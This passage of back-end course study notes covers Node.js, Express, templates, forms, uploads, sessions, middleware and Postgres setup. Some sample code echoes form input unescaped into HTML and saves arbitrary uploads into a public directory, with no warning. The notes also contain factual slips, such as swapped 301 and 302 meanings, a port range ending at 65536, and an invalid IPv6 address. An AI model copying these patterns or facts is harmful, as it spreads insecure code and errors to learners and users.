Back-End Fundamentals
1. Ports & IP Addresses  
2. Starting A Node Application  
3. Configure Node to Serve Static Files in a Directory  
4. Authoring A Trivial Node App  
5. Describe common URL structures  
6. Dynamic Routes in Express  
7. HTML Templates with Mustache  
8. Form Validation  
9. Returning Appropriate HTTP Response Codes  
10. Receiving Uploaded Files Using Busboy  
11. Login Based Authentication  
12. Author a website with user authentication workflow  
13. Structure of an Express app  
14. Express routing  
15. Understanding middleware  
16. Output logs using the morgan package  
17. Installing and setting up Postgres  
18. Databases, tables, rows, and columns  
19. Exporting and importing PostgreSQL databases  
20. SQL Statements  
21. Create models with Sequelize  
22. Use Sequelize models  
23. Express/Sequelize CRUD Operations  
24. Associations: belongsTo, hasOne, hasMany, and belongsToMany  
25. Author Model Class Methods, Attributes, And Instance methods  
26. Installing and setting up MongoDB  
27. MongoDB databases, collections, and documents  
28. Importing and exporting data from MongoDB  
29. MongoDB Operations  
30. Schemas and Models with Mongoose  
31. Create, query, update, and delete models with Mongoose  
32. Validating models with Mongoose  
33. Extending Mongoose models  
34. Use and verify express JSON APIs using postman and curl  
35. Return objects and arrays of data using JSON  
36. Use routing appropriately for RESTful URL structure and HTTP verbs  
37. Describe standard REST conventions in NodeJS  
38. Filter results based on URL parameters in NodeJS  
39. Adding token based user authentication to an Express API  
40. Restricting Access To Information Based On User Role  
41. Test Driven Development (TDD)  
42. Author feature tests using Jest for an Express app  
43. Author unit tests for Express models  
44. Naming Conventions and Class/Function Length Best Practices  
45. Appropriate Use cases To Run next()  
46. Lecture Notes  
47. The Impact Of XSS On User Privacy  
48. Protecting User Password  
49. Agile Software Development  
50. Using npm package.json scripts to start node and run arbitrary tasks  
51. Basic Scripts  
52. Using ESLint to find errors and coding style irregularities  
53. Platform-as-a-service And Virtual-private-servers  
54. Deploying A Node application on Heroku  
55. Sending Emails with SendGrid  
56. Storing and retrieving objects in S3 block storage  
57. Block Level Storage  
View Course
Back-End Fundamentals Encyclopedia

The Encyclopedia is a compilation of all the lesson study notes in this course. Use it to look up the a term or concept that you have covered.

---

[Express and NodeJS: Hello World](ExpressNodeJS.md)

# Ports & IP Addresses  

## Terminology  

* `IP address` (Internet protocol): a device's unique numeric identifier.

* **Internet Protocol Versions**:

  * `IPv4`: Most widely used Internet protocol. (Covered in this lesson)

    * Made up of four sets of numbers divided by periods.

    * Each set containing 1-3 digits, ranging from 0 to 255.

    * `Static`: number never changes.

      * Reveals a device's continent, country, region, and city.

    * `Dynamic`: temporary. Assigned each time a machine accesses the internet.

  * `IPv6`: Evolutionary upgrade to `IPv4`. Designed to address the decreasing number of Internet addresses.

    * Uses a 128-bit address scheme that uses hexadecimal and separated by colons. i.e., 2bbe:1850:3:300:h8gg:ba21:68ce

    * See references for more details.

* `Ports`: an operating system's communication endpoint.

  * **Port number**: 16-bit integer, ranging from 0 to 65535.

    * 0 - 1023: system/well-know ports. Widely used network services. i.e., 80 HTTP, 443 HTTPS, 22 SSH, 21 FTP, 70 gopher, etc. (see references)

    * 1024 - 49151: registered ports. Assigned by [IANA](https://www.iana.org/) to an entity. i.e., 1020 Quicktime, 23399 Skype, 2375 Docker REST API.

    * 49152 - 65536: private/dynamic ports. Cannot be registered with IANA.

  * **Transport layer**: specify source and destination port number in the header.

  * **Protocol**: interaction rules used by endpoints in order to communicate.

    * `TCP` (Transmission Control Protocol): connection-based transmission of data.

      * Dependent on successful connection between endpoints.

      * Data is sent and received in sequential order.
      

* **IP/Port relationship**: the `IP address` is used to locate a particular device. The `port` is used to access a network service on that device.

> * All communication on the internet is from `IP address` to `IP address`.
> * A router assigns both 'private' and 'public' `IP addresses`. 'Public' addresses can be accessed over the internet. 'Private' addresses are only accessible from within the device's network.

### Example  

In this example we run a local server on a local network, accessing port 3000.

```
192.168.2.1:3000
```

> Consider mentioning how to make a server available over the internet via port 80 and the global public ip address. This would entail opening port 80 on the router, setting up port forwarding, running the server on port 80 (proxies to port 3000), etc.

---

[Express and NodeJS: Hello World](ExpressNodeJS.md)

# Starting A Node Application  

## Terminology  

* **Node.js**: open-source and cross-platform JavaScript runtime used to build network application.

  * Provides JavaScript [modules](https://medium.com/startup-study-group/40-npm-modules-we-can-t-live-without-36e29e352e3a) for web application development.

  * It is fast and never buffers data.

  * Scalable.

* **Express.js**: open-source Node.js framework designed to build web applications and API's.

## Pre-requisite  

* **Install node**:

Check node version:

```
  $ node -v
```

Install node: `brew install node`

```
  $ brew install node
```

## Application Setup  

* `mkdir express-app`

* `cd express-app`

* `npm init`

  * accept all default options.

* `npm install express --save`

## Author Application  

* touch: express-app.js

* Then:

```js
const express = require('express');
const app = express();

app.get('/', function (req, res) {
  res.send('Hello World!');
});

app.listen(3000, function () {
  console.log('Successfully started express application!')
});
```

### Start application:

Call `node` followed by the app's name in terminal.

```
$ node express-app.js
```

* Open browser to: 

```
localhost:3000
```

![starting-node-app.jpeg](./images/starting-node-app.jpeg)

## Try it!  

> Starting Node.zip (424 KB)

---

[Express and NodeJS: Hello World](ExpressNodeJS.md)

# Configure Node to Serve Static Files in a Directory  

## Terminology  

* `express.static()`: built-in middleware function used to configure the location of files to be served by an `express.js` application.

* `paths`:

  * Relative path:
  
```
  app.use(express.static('public'))
```

* Adding a virtual path:

  * Specify mount point.
  
  * Virtual path prefix (non-existent in the file system). i.e., '/files'

```
  app.use('/static', express.static('public'))
```

* Absolute path:

  * Safer when the app runs from a different directory.
  
```
  app.use('/files', express.static(path.join(__dirname, 'public')))
```

## Example 1  

**File**: ironyardlogo.png

**Directory**: serve-static-files/public

**Configuration**:

Relative to the static directory.

```
app.use(express.static('public'))
```

**Accessing file on port 3000**:

```
http://localhost:3000/ironyardlogo.png
```

## Example 2  

**File**: video.mp4

**Directory**: serve-static-files/public

**Configuration**:

* Absolute path:

```
app.use('/files', express.static(path.join(__dirname, 'public')))
```

**Accessing file on port 3000**:

```
http://localhost:3000/files/video.mp4
```

### Multiple Directories  

To add multiple directories, simply add them in the order you would like `express.js` to search for a particular file.

```jsx
// Relative to the static directories
app.use(express.static('public'))
app.use(express.static('utilities'))

// Absolute path to the directories
app.use('/files', express.static(path.join(__dirname, 'public')))
app.use('/utilities', express.static(path.join(__dirname, 'utilities')))
```

> The order of the static files determines how Express searches for a file.

## Try it!  

This sample does not contain the 'utilities' directory as per the example above.

> serve-static-files.zip (2 MB)

---

[Express and NodeJS: Hello World](ExpressNodeJS.md)

# Authoring A Trivial Node App  

A Fill Murray Image App  

* `mkdir`: trivial

* `cd` into 'trivial' directory.

* `npm init`: accept all default options.

* `npm install`, then:

  * Add `express web server` dependency: `npm install express --save`

* `mkdir`: 'files'

  * Add images files.

* `touch`: index.html

  * `Add` content.

* `touch`: 'trivial-app.js'

  * configure `express.static` to use a relative path.
  
```jsx
    app.use('/files', express.static('files'));
```

* configure `app.get()` to listen on root ('/').

* configure `app.get()` to serve `index.html` from `root`.

```jsx
//Listening on root
app.get('/', function (req, res) {
  //serve 'index.html'
  res.sendFile(path.join(__dirname + '/index.html'));
  //__dirname: resolves to  project folder.
})
```

### Implementation  

#### trivial-app.js:

``` jsx
const express = require('express');
const path = require('path');
const app = express();

//virtual prefix and an absolute path.
app.use('/files', express.static(path.join(__dirname, 'public')));

//Listening on root
app.get('/', function (req, res) {
  //serve 'index.html'
  res.sendFile(path.join(__dirname + '/index.html'));
  //__dirname: resolves to  project folder.
})

app.listen(3000, function () {
  console.log('Successfully started express application!');
})
```

#### index.html:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Trivial Express App</title>

    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css">
    <style>
        body { padding-top:50px; }
    </style>
</head>
<body>

    <div class="container">
        <header class="jumbotron">
            <h1>Fill Murray Pictures</h1>
            <h3>A Trivial Node App</h3>
        </header>
        <section class="row">
          <h3 class="col-xs-12 col-md-12">Fill Murray Images</h3>
          <ul class="list-group col-xs-12 col-md-12">
            <li class="list-group-item">
              <p>Access the files in the browser:</p>
              <pre><code>localhost:3000/files/murray1.jpg</code></pre>
              <p>Or use the links below:</p>
            </li>
            <li class="list-group-item">
              <a href="http://localhost:3000/files/murray1.jpg">Image 1</a>
            </li>
            <li class="list-group-item">
              <a href="http://localhost:3000/files/murray1.jpg">Image 2</a>
            </li>
            <li class="list-group-item">
              <a href="http://localhost:3000/files/murray3.jpg">Image 3</a>
            </li>
          </ul>
        </section>
        <section class="row">
          <header class="jumbotron">
            <h2>App Configuration</h2>
          </header>
          <div class="col-sm-6 col-md-4">
            <div class="thumbnail">
              <img src="files/murray1.jpg" alt="...">
              <div class="caption">
                <h3>Default Route</h3>
                <h4>Listen on <code>root</code></h4>
                <h4>Serve <code>index.html</code></h4>
                <code>app.get('/', function (req, res) {
res.sendFile(path.join(__dirname + '/index.html'));
})</code>
              </div>
            </div>
          </div>

          <div class="col-sm-6 col-md-4">
            <div class="thumbnail">
              <img src="files/murray2.jpg" alt="...">
              <div class="caption">
                <h3>Set Static Files In A Directory</h3>
                <p>configure <code>express.static</code> to use a virtual prefix (<code>/files</code>) and an absolute path.</p>
                <code>app.use('/files', express.static(path.join(__dirname, 'files')));</code>
              </div>
            </div>
          </div>

          <div class="col-sm-6 col-md-4">
            <div class="thumbnail">
              <img src="files/murray3.jpg" alt="...">
              <div class="caption">
                <h3>Listen On Port 3000</h3>
                <code>app.listen(3000, function () {
                  console.log('Successfully started node application!')
                })</code>
              </div>
            </div>
          </div>
        </section>
    </div>

</body>
</html>
```

## Start application  

```
node trivial-app.js
```

* Open browser to: `localhost:3000`

## Try it!  

> trivial-app.zip (70 KB)

---

[Express: Dynamic](ExpressDynamic.md)

# Describe common URL structures  

Terminology  

**URI**: 1 A Uniform Resource Identifier (URI) is a string of characters used to identify a resource. Such identification enables interaction with representations of the resource over a network, typically the World Wide Web, using specific protocols.

**URL**: 2 A Uniform Resource Locator (URL), colloquially termed a web address,[1] is a reference to a web resource that specifies its location on a computer network and a mechanism for retrieving it.

**URN**: 3 A Uniform Resource Name (URN) is a Uniform Resource Identifier (URI) that uses the urn scheme.

**HTTP**: The Hypertext Transfer Protocol (HTTP) is a set of rules used to describe ow information is passed via hyperlinks between hypertext nodes. HTTP is the foundation of data communication for the World Wide Web.

## Examples  

### Structure

* URI

* URL

* URN

### Protocol

* HTTP
* HTTPS

### Domain name

* Second level domain name

  * Subdomain

  * Host name

*Top level domain name

### Extensions

* Port

* Path to a file

* Parameters

* Anchor

| protocol |	domain name |	domain name |	domain name |	port |	path to file |	parameters |	anchor |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| | second level domain name |	second level domain name |	top level domain name | | | | |				
| | subdomain |	host name	| | | | | |				
| https:// |	www. |	example |	.com |	:80 |	/path/to/somefile.html |	?key1=value1&key2=value2 |	#somewhereInTheDocument ||

### Absolute v relative

* Used within an HTML document

* Full URL

* Implicit protocol

* Implicit domain name

### URL Naming - Semantic URL Considerations

* Simplicity

* Memorability

* Interpretability

* Consistency

## References  

Lesson Footnotes
* 1: [Wikipedia - Uniform Resource Identifier](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier)

* 2: [Wikipedia - Uniform Resource Locator](https://en.wikipedia.org/wiki/URL)

* 3: [Wikipedia - Uniform Resource Name](https://en.wikipedia.org/wiki/Uniform_Resource_Name)

--- 

[Express: Dynamic](ExpressDynamic.md)

# Dynamic Routes in Express  

## Terminology  

**Route Parameters**: 1Route parameters are named URL segments used to capture the values specified at their position in the URL. The named segments are prefixed with a colon and then the name (e.g. `/:your_parameter_name/`. The captured values are stored in the req.params object using the parameter names as keys (e.g. `req.params.your_parameter_name`).

**Word Character**: 2A "word character" within ASCII typically means a letter of the alphabet A-Z (upper or lower case), the digits 0 to 9, and the underscore.

## Examples  

```jsx
app.get('/users', function (req, res) { /* ... */ });

app.get('/:dynamic_route', function (req, res) {
  res.send(req.params.dynamic_route);
});
```

## References  

#### Lesson Footnotes

* 1: [MDN - Express Tutorial Part 4: Routes and controllers(https://developer.mozilla.org/en-US/docs/Learn/Server-side/Express_Nodejs/routes)

* 2: [MDN - Character - Word Character](https://en.wikipedia.org/wiki/Character_(computing)#Word_character)

---

[Express: Dynamic](ExpressDynamic.md)

# HTML Templates with Mustache  

## Terminology  

**template**: a predefined component written in a programming language and compiled into HTML at runtime by a template engine. Because they are written with a programming language they can contain variables and functions, can perform text replacement, file inclusion (or transclusion), conditional evaluations, and loops.

## Examples  

`./views/index.mustache`

```html
<p>
  Hello, {{ userName }}!
</p>
```

`./app.js`

```jsx
// requires and environment setup ...

const mustacheExpress = require('mustache-express');
app.engine('mustache', mustacheExpress());
app.set('views', './views')
app.set('view engine', 'mustache')

app.get('/', function (req, res) {
  res.render('index', { userName: 'Sam' })
})
```

## References  

* [mustache reference](https://mustache.github.io/mustache.5.html)

* [GitHub - mustache.js](https://github.com/janl/mustache.js)

* [Using template engines with Express](https://expressjs.com/en/guide/using-template-engines.html)

---

[Express Forms](ExpressForms.md)

# Form Validation  

## Terminology  

* body-parser: middleware that parses incoming request bodies.

  * Stores a form's input in a JavaScript object.

  * Accessible through req.body.

  * For the following middlewares, the request Content-Type header must match the type option.

    * bodyParser.json(options): parses json.
    
    * bodyParser.raw(options): parses all bodies as buffer.
    
    * bodyParser.text(options): parses all bodies as a string.
    
    * bodyParser.urlencoded(options): parses urlencoded bodies, only.

  * See [docs](https://github.com/expressjs/body-parser).

* express-validator: middleware for node-validator (string validators and sanitizers)

  * Validates input passed by the browser.

  * Configuration: expressValidator must come after bodyParser (see example).

  * Validations (see docs for complete list):
  
    * req.checkBody(): only checks req.body.

    * req.checkQuery(): only checks req.query.

    * req.checkParam(): only checks req.params.
    
  * Validators:

    * isEmpty(): validates if string has length of zero.

    * isEmail(): validates if string is an email.

    * equals(): validates string agains a string.

    * See all validator for a complete list.

  * See docs.
  
> String validator, only.

## Body-parser  

### body-parser installation  

```
$ npm install body-parser --save
```

### body-parser implementation  

```jsx
var express = require('express');
var bodyParser = require('body-parser');

// Create app
var app = express();

// Set app to use bodyParser()` middleware.
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));

app.get('/', function(req, res){
  // Set 'action' to '/'
  var html = '<form action="/" method="post">' +
             '<h1>User Name</h1>' +
             '<p>Enter your email</p>' +
             '<input type="text" name="email" placeholder="email address" />' +
             '<button type="submit">Submit</button>' +
         '</form>';         
  res.send(html);
});

// Receives data from form (action='/')
// 'req.body' now contains form data.
app.post('/', function(req, res){
  var email = req.body.email;
  var html = '<p>Your user name is: </p>' + email;
  res.send(html);
});
app.listen(3000);
```

## Express-validator  

### express-validator installation  

```
$ npm install express-validator --save
```

### bodyparser and express-validator implementation  

```jsx
var express = require('express');
var bodyParser = require('body-parser');
var expressValidator = require('express-validator');

// Create app
var app = express();

// Set app to use bodyParser()` middleware.
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
//'extended: false' parses strings and arrays.
//'extended: true' parses nested objects
//'expressValidator' must come after 'bodyParser', since data must be parsed first!
app.use(expressValidator());

app.get('/', function(req, res){
  // Set 'action' to '/'

  var html = '<form action="/" method="post">' +
             '<h1>User Name</h1>' +
             '<p>Enter a username</p>' +
             '<input type="text" name="user" placeholder="user name" />' +
             '<button type="submit">Submit</button>' +
        '</form>';
  res.send(html);
});

// Receives data from form (action='/')
// 'req.body' now contains form data.
app.post('/', function(req, res){
  //Call req.checkBody function.
    //Pass inputs to validate.
    //Tell middleware which validators to apply (chain one or more).
    req.checkBody("user", "You must enter a username!").notEmpty();

    var errors = req.validationErrors();
    if (errors) {
      // Render validation error messages
      var html = errors;
      res.send(html);
    } else {
      var user = req.body.user;
      var html = '<p>Your user name is: </p>' + user;
      res.send(html);
    }
  });
app.listen(3000);
```

### try it!  

express-form-validation.zip (8 KB)

---

[Express Forms](ExpressForms.md)

# Returning Appropriate HTTP Response Codes  

## Terminology  

`HTTP` response codes categories:

* 200s: Success

* 300s: Redirection

* 400s: Client error

* 500s: Server error

More information on each request:

* HTTP Status Cats API

* HTTP Statuses

## Most Common HTTP Status Codes  

* [200](https://httpstatuses.com/200) - Response was OK

* [201](https://httpstatuses.com/201) - Created Successfully (Forms)

* [301](https://httpstatuses.com/301) - Redirect Temporarily

* [302](https://httpstatuses.com/302) - Redirect Permanently

* [400](https://httpstatuses.com/400) - Problem with the Request (generic)

* [401](https://httpstatuses.com/401) - Need to Sign In

* [403](https://httpstatuses.com/403) - Unauthorized

* [404](https://httpstatuses.com/404) - Not Found

* [422](https://httpstatuses.com/422) - Problem with the content. (Errors)

* [500](https://httpstatuses.com/500) - Server Error (Problem with Code)

* [503](https://httpstatuses.com/503) - Server is unavailable (Problem with Service)

## Why Use HTTP Status Codes  

When browsing a website, our browsers use HTTP statuses behind the scenes. For example, if you visit a page that has moved, the web app may response with a 301 response (MOVED), telling the browser the new location. [Cat](https://http.cat/301) | [Details](https://httpstatuses.com/301)

Our browser will transparently grab the "location" from the response and move us to the new location.

Alternatively, if the response is a [200](https://httpstatuses.com/200), our browser knows everything went ok with the response and to parse the response and display our HTML.

## Examples  

By default, express will add a status of [200](https://httpstatuses.com/200) when we `render`, and a [302](https://httpstatuses.com/302) when we `redirect`.

But what if we want to prevent a user from accessing a particular route in our application? We'll want to return a [403](https://httpstatuses.com/403) ("forbidden").

```jsx
const express = require('express');
const path = require('path');
const mustacheExpress = require('mustache-express');
const app = express();
app.engine('mustache', mustacheExpress());
app.set('view engine', 'mustache')
app.use(express.static(path.join(__dirname, 'public')));

// Routes
app.get('/', function(req, res){
  res.render('index');
});

// If non-authorized user visits to '/dashboard', 403 and render 403.mustache in the errors directory
app.get('/dashboard', function(req, res){
  res.status(403);
  res.render("errors/403")
});


<div class='callout-download'>
<p>Download and run <code>npm install</code> and then <code>node http-codes.js</code>. When you visit <code>/dashboard</code>, it will render a 403 error.</p>

<ul>
<li><a href="https://tiy-learn-content.s3.amazonaws.com/c5740929-express-http-codes.zip">express-http-codes.zip</a> (9 KB)</li>
</ul>
</div>
```

---

[Express Forms](ExpressForms.md)

# Receiving Uploaded Files Using Busboy  

## Terminology  

* `busboy`: module used to parse incoming `HTML` form data. Simplifies file upload process.

* `pipe()`: method used to read data from a 'file' and write to a destination writable stream.

* `fs`: module used to perform file system related operations on a machine, such as reading files, creating files, deleting files, updating files, and renaming files.

  * `js. createWriteStream()`: method used to create a writable data stream.

* `Node.js OS module`: module used for obtaining operating system related information.

  * `The os.tmpdir()`: method that returns the OS's default directory for temporary files in a string.

## Installation  

```
npm install busboy --save
```

## Setup  

### Include  

```js
  var http = require('http'), //If using HTTP server and client
  var path = require('path'),
  var os = require('os'),
  var fs = require('fs');

  var Busboy = require('busboy');
```

### Saving a file  

Instantiate `busboy`:

```js
var busboy = new Busboy({ headers: req.headers });
```

Configure busboy to save upload file:

* You must include five parameters in the busboy middleware function: (fieldname, file, filename, encoding, mimetype)

```js
busboy.on('file', function(fieldname, file, filename, encoding, mimetype) {
    // Set a temporary directory to save incoming file.
     var saveTo = path.join(os.tmpDir(), path.basename(fieldname));
     // Or
     // Set project directory to save incoming file.
     var saveTo = path.join('./public/uploads/', path.basename(filename));
     // Save the incoming file.
     file.pipe(fs.createWriteStream(saveTo));
   });
```

### Finishing the upload  

```js
busboy.on('finish', function() {
  console.log('Upload complete');
  // Send back HTTP response.
  res.writeHead(200, { 'Connection': 'close' });
  // End response.
  res.end("File saved!");
});
```

### Implementation  

In this example we do not use the `HTTP` module and we use `views` and `routes`. We also perform a couple of checks before the file is uploaded:

* If no file is selected and the file is not a 'pdf' we send back a 500 code and we end the response.

* We also use `fs-extra`, which adds file system methods that aren't included in the native `fs` module and adds promise support to the `fs` methods.

```js
var express = require('express');
var path = require('path');
var index = require('./routes/index');
var bodyParser = require('body-parser');
var mustache = require('mustache-express');
var fs = require('fs-extra');
var Busboy = require('busboy');
var app = express();
app.engine('mustache', mustache());
app.set('view engine', 'mustache');
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

app.use('/', function(req, res){
  res.render("index");
});

// Accept POST request on '/upload'.
app.post('/upload', function (req, res) {
  var busboy = new Busboy({ headers: req.headers });
  busboy.on('file', function(fieldname, file, filename, encoding, mimetype) {
    var saveTo = path.join('./public/uploads/', path.basename(filename));
    file.pipe(fs.createWriteStream(saveTo));
  });
  busboy.on('finish', function() {
    res.writeHead(200, { 'Connection': 'close' });
    res.end("Uploaded file to: /uploads");
  });
  //Parse HTTP-POST upload
  return req.pipe(busboy);
});

app.listen(3000, function () {
  console.log('Successfully started node application!')
})
```

> Remember to set the enctype in your HTML Form to "multipart/form-data"

```html
<form action="/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
  <input type="submit" value="Upload file">
</form>
```

Try it  

> Try out the example! When you upload a file, it will store it in public/uploads
express-file-upload-busboy.zip (7 KB)

---

[Express Authentication](ExpressAuthentication.md)

# Login Based Authentication  

### Basic Authentication  

* Client requests secure resource

* Server requests username and password

* Client sends username and password

* Server returns requested resource

### Session Based Authentication  

* Client authenticates by providing credentials via HTTP request.

* The server provides a `session_id` via HTTP response.

  * `session_id` is an identifier associated with a user account.

  * `session_id` can be stored in a cookie.

  * `session_id` is stateful.
  
* `session_id` is attached to to subsequent outgoing requests.

* Sessions can be limited to certain time periods

* Security concerns

* Scalability concerns

* Excessive memory usage

## Terminology  

**Authentication** [^1]After becoming a subscriber, the user receives an authenticator e.g., a token and credentials, such as a user name. He or she is then permitted to perform online transactions within an authenticated session with a relying party, where they must provide proof that he or she possesses one or more authenticators

**HTTP cookies**: [^2]An HTTP cookie (web cookie, browser cookie) is a small piece of data that a server sends to the user's web browser, that may store it and send it back together with the next request to the same server.

## Examples  

![traditional-session-based-diagram'](./images/traditional-session-based-diagram.png)

## References  

[^1] [Wikipedia - Authentication](https://en.wikipedia.org/wiki/Authentication)

[^2] [HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)


---

[Express Authentication](ExpressAuthentication.md)

# Author a website with user authentication workflow  

Use the npm package [express-session](https://www.npmjs.com/package/express-session) to set up user authentication.

## Terminology  

**Authentication** [^1]After becoming a subscriber, the user receives an authenticator e.g., a token and credentials, such as a user name. He or she is then permitted to perform online transactions within an authenticated session with a relying party, where they must provide proof that he or she possesses one or more authenticators

**HTTP cookies**: [^2]An HTTP cookie (web cookie, browser cookie) is a small piece of data that a server sends to the user's web browser, that may store it and send it back together with the next request to the same server.

## Examples  

```js
var express = require('express')
var parseurl = require('parseurl')
var session = require('express-session')

var app = express()

app.use(session({
  secret: 'keyboard cat',
  resave: false,
  saveUninitialized: true
}))

app.use(function (req, res, next) {
  var views = req.session.views

  if (!views) {
    views = req.session.views = {}
  }

  // get the url pathname
  var pathname = parseurl(req).pathname

  // count the views
  views[pathname] = (views[pathname] || 0) + 1

  next()
})

app.get('/foo', function (req, res, next) {
  res.send('you viewed this page ' + req.session.views['/foo'] + ' times')
})

app.get('/bar', function (req, res, next) {
  res.send('you viewed this page ' + req.session.views['/bar'] + ' times')
})
```

## References  

[NPM - express-session](https://www.npmjs.com/package/express-session)

[^1] [Wikipedia - Authentication](https://en.wikipedia.org/wiki/Authentication)

[^2] [HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)

---

[Organizing large Express applications](OrganizingExpress.md)

# Structure of an Express app  

## Vocabulary  

* *module*: a JavaScript source file that defines `module.exports`

* `require`: a Node function to require other files or libraries. Comes in two types:

  * `require("library_name")` -- requires a core library or library installed via npm

  * `require("./library_name")` -- requires a file you have written in this project

* *MVC*: stands for Model View Controller. These are the three parts of this way of building software. The MVC architecture is used widely in web development.

  * The *model* controls access to data and ways to manipulate that data.

  * The *view* presents an interface to the user based off data.

  * The *controller* facilitates communication between models and views and handles user input.

  * In Express, *models* can be anything we choose to handle our data. *Views* are our templates or functions that format the response to the user. *Controllers* are our routes -- specifically, they're the functions we connect to routes. We could put those functions in a separate file and separate our routes and controllers.

## Examples  

Example model in its own file:

```js
// models/user.js

const users = [
  {username: 'alexis', email: 'alexis@gmail.com'},
  {username: 'landry', email: 'landry@hotmail.com'}
  // ...
]

function getUser(username) {
  return users.find(function (user) {
    return user.username == username
  });
}

module.exports = {
  find: getUser,
  all: users
}

// app.js
const User = require('./models/user');
console.log(User.find('landry'));
console.log(User.all);
```

Example file layout for an Express application:

This example comes from a fictional blogging application.

```
project_directory/
|- package.json
|- app.js
|- routes/        <---- routes/controllers
|   |- users.js
|   \- posts.js
|- models/        <---- models
|   |- user.js
|   |- post.js
|   \- comment.js
|- views/         <---- templates
|   |- login.mustache
|   |- register.mustache
|   |- index.mustache
|   |- layout.mustache
|   \- ...
\- public/        <---- static files, could also be called "static"
    |- app.css
    \- ...
```

---

[Organizing large Express applications](OrganizingExpress.md)

# Express routing  

## Vocabulary  

* *router*: a self-contained collection of routes and middleware

* *web request*: the message sent from your browser (or another program) that tells your web server to send back data. Contains a HTTP verb (GET, POST, etc), a URL, headers, and possibly a body.

* *web response*: the data sent back from your web server. Contains headers, a status code, and a body.

## Examples  

Using `express.Router` for an admin section:

```js
// routes/admin.js
const express = require('express');
const router = express.Router();

router.use(function adminAuth (req, res) {
  // code for authorizing admins
});

router.get('/users', function (req, res) {
  res.render("users", {});
});

module.exports = router;

// app.js
const express = require('express');
const adminRouter = require('./routes/admin');

const app = express();

app.use('/admin', adminRouter);
```

Using multiple route handlers for a Twitter clone:

```js
const getUser = function (req, res, next) {
  const userId = req.params.userId;
  const user = User.get(userId);

  if (user) {
    req.user = user;
    next();
  } else {
    res.status(404).render("404");
  }
}

app.get('/:userId/timeline', getUser, function (req, res) {
  const tweets = req.user.tweets;
  res.render("timeline", {user: req.user, tweets: tweets});
});

app.get('/:userId/profile', getUser, function (req, res) {
  res.render("profile", {user: req.user});
});

app.get('/popular', function (req, res) {
  const tweets = getPopularTweets();
  res.render("popular", {tweets: tweets});
});
```

## Resources  

[Express.js Routing](https://expressjs.com/en/guide/routing.html)

[Express.js API Docs on express.Router](https://expressjs.com/en/4x/api.html#router)

[Express Routing - Advanced Techniques](http://jilles.me/express-routing-advanced-techniques/)

---

[Organizing large Express applications](OrganizingExpress.md)

# Understanding middleware  

## Terminology  

*middleware*: a function used with Express that takes a request, response, and `next`, which is a function to call to pass control to the next middleware or route handler in the chain. The concept of middleware is used in other web frameworks and software.

## Examples  

An example of logging requests with a middleware:

```js
app.use(function (req, res, next) {
    console.log("Request at", new Date());
    console.log("URL:", req.url);
    console.log("Query:", req.query, "\n");
    next();
})
```

An example of setting a header. The `Server` header is the name of the server.

```js
const setServerName = function (name) {
  return function (req, res, next) {
      res.header("Server", name);
      next();
  }
}

app.use(setServerName("Dynamo 1000"));
```

---

[Organizing large Express applications](OrganizingExpress.md)

# Output logs using the `morgan` package  

Morgan is an HTTP request logger middleware for node.js.

The `morgan()` function accepts 2 arguments: `format` and `options`.

`format` can be a predefined string name, a string of a format string, or a function that will produce a log entry.

The `options` object accepts a number of properties.

## Terminology  

## Examples  

The following example demonstrates using the `'combined'` format (standard for Apache servers):

```js
var express = require('express')
var morgan = require('morgan')

var app = express()

app.use(morgan('combined'))

app.get('/', function (req, res) {
  res.send('hello, world!')
})
```

This example demonstrates using a conditional statement to check whether the app is running in the `'dev'` environment or in `'production'`. While in production morgan is using the `'common'` format and passing an `options` object. The `options` object, in this case, is set to skip logging if the response status code is less than `400` and stream logs to an external file: (`__dirname + '/../morgan.log'`). While in development morgan uses the `'dev'` format.

```js
var express = require('express')
var morgan = require('morgan')

var app = express()

if (app.get('env') == 'production') {
  app.use(morgan('common', {
    skip: function(req, res) {
      return res.statusCode < 400
    },
    stream: __dirname + '/../morgan.log'
  }));
} else {
  app.use(morgan('dev'));
}
```

## References  

[GitHub - Express, Morgan](https://github.com/expressjs/morgan)

---

[SQL: Introduction](SQLIntroduction.md)

# Installing and setting up Postgres  

## Terminology  

* *PostgreSQL*: a database management system. Also known sometimes as PostgreSQL.

* *background process*: a program that runs in the background. Can be managed with `brew services`.

## Examples  

The following example demonstrates how to see which services are running.

```
$ brew services list
Name       Status  User       Plist
postgresql started [username] /Users/[username]/Library/LaunchAgents/homebrew.mxcl.postgresql.plist
```

This example shows how to create a database, connect to it, and delete it.

```
$ createdb testdb
$ psql testdb
psql (9.6.3)
Type "help" for help.

testdb=# help
You are using psql, the command-line interface to PostgreSQL.
Type:  \copyright for distribution terms
       \h for help with SQL commands
       \? for help with psql commands
       \g or terminate with semicolon to execute query
       \q to quit
testdb=# \q
$ dropdb testdb
```

## References  

* [brew services](https://github.com/Homebrew/homebrew-services)

* https://www.postgresql.org/

---

[SQL: Introduction](SQLIntroduction.md)

# Databases, tables, rows, and columns  

## Terminology  

* *database*: a storage area for tables and all other data associated with those tables. "Database" is also often used to refer to a database management system like PostgreSQL.

* *table*: a named collection of records, all with the same structure.

* *row*: a record in a table.

* *column* : a field in a table that all records will have. Columns have a name and a type.

* *primary key*: a unique id that each row in a table has. This will usually be an auto-incrementing number called `id`, although that is not a requirement of the database.

## Examples  

This example shows the syntax for `CREATE TABLE`.

```
CREATE TABLE students (
  id SERIAL PRIMARY KEY,
  name VARCHAR(100) NOT NULL,
  email VARCHAR(100) NULL UNIQUE,
  favorite_candy VARCHAR(100) NULL,
  graduated BOOLEAN NOT NULL DEFAULT 'f',
  cohort INTEGER NOT NULL
);
```

This example shows the syntax for `INSERT INTO`.

```
INSERT INTO students (name, favorite_candy, graduated, cohort) VALUES ('Charlie', 'Skittles', 't', 1);
INSERT INTO students (name, email, cohort) VALUES ('Harper', 'harper@example.org', 12);
INSERT INTO students (name, favorite_candy, cohort) VALUES
('Kelly', 'Milky Way', 12),
